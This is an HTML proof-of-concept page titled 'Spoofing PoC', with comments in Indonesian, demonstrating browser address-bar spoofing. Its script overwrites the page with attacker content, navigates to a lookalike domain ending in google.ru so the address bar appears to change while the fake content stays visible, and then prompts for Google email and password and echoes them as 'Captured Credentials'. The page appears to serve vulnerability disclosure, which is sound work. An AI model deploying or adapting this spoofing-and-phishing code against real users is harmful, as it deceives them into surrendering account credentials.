<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spoofing PoC</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      font-family: sans-serif;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <button onclick="executeSpoof()">Start Test</button>

  <script>
    function executeSpoof() {
      // 1. Mengubah tampilan halaman lokal menjadi halaman phishing/palsu terlebih dahulu
      document.body.innerHTML = `
        <div style="text-align:center; padding: 50px;">
          <h1 style="color: red;">This is not Google.</h1>
          <p>This is an attacker-controlled page rendering custom HTML.</p>
        </div>
      `;

      // 2. Picu navigasi ke port yang tidak merespons untuk menahan pencucian halaman (page flush)
      // Address bar akan langsung memperbarui ke google.com:8888 sementara konten "This is not Google" tetap tampil
      let win = window.open('http://www.aaaaa.bbbbb.ccccc.testing.accounts.google.ru', '_top');

      // 3. Opsional: Jalankan prompt otomatis di atas halaman palsu tersebut
      setTimeout(() => {
        let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
        if (user) {
          alert('Captured Credentials: ' + user);
        }
      }, 100);
    }
  </script>

</body>
</html>
